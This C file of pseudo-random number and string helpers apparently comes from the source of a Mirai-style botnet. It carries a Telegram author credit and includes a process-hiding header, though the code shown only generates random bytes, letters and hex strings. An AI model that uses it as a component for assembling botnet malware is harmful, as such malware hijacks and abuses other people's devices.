// by juan @ipmiv2 on telegram

#define _GNU_SOURCE

#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include "headers/config.h"
#include "headers/rand.h"
#include "headers/process.h"
#include "headers/util.h"
#include "headers/process_hider.h"

static uint32_t x, y, z, w;
static char hex[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};

void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void)
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

void rand_str(char *str, int len)
{
    while (len > 0)
    {
        if (len >= 4)
        {
            *((uint32_t *)str) = rand_next();
            str += sizeof(uint32_t);
            len -= sizeof(uint32_t);
        }
        else if (len >= 2)
        {
            *((uint16_t *)str) = rand_next() & 0xFFFF;
            str += sizeof(uint16_t);
            len -= sizeof(uint16_t);
        }
        else
        {
            *str++ = rand_next() & 0xFF;
            len--;
        }
    }
}

void rand_alpha_str(uint8_t *str, int len)
{
    const char alphaset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

    while (len > 0)
    {
        if (len >= sizeof(uint32_t))
        {
            uint32_t entropy = rand_next();
            for (int i = 0; i < sizeof(uint32_t); i++)
            {
                uint8_t tmp = entropy & 0xff;
                entropy >>= 8;
                tmp %= sizeof(alphaset) - 1;
                *str++ = alphaset[tmp];
            }
            len -= sizeof(uint32_t);
        }
        else
        {
            *str++ = alphaset[rand_next() % (sizeof(alphaset) - 1)];
            len--;
        }
    }
}

void rand_alphastr(uint8_t *str, int len)
{
    const char alphaset[] = "w5q6he3dbrsgmclkiu4to18npavj702f";

    while (len > 0)
    {
        if (len >= sizeof(uint32_t))
        {
            uint32_t entropy = rand_next();
            for (int i = 0; i < sizeof(uint32_t); i++)
            {
                uint8_t tmp = entropy & 0xff;
                entropy >>= 8;
                tmp >>= 3;
                *str++ = alphaset[tmp];
            }
            len -= sizeof(uint32_t);
        }
        else
        {
            *str++ = alphaset[rand_next() % sizeof(alphaset)];
            len--;
        }
    }
}

uint32_t rand_next_range(uint32_t min, uint32_t max)
{
    return (rand_next() % (max - min + 1)) + min;
}

void rand_hex(char *str, int len) {
    while (len > 0) {
        *str++ = hex[rand_next() % 16];
        len--;
    }
}
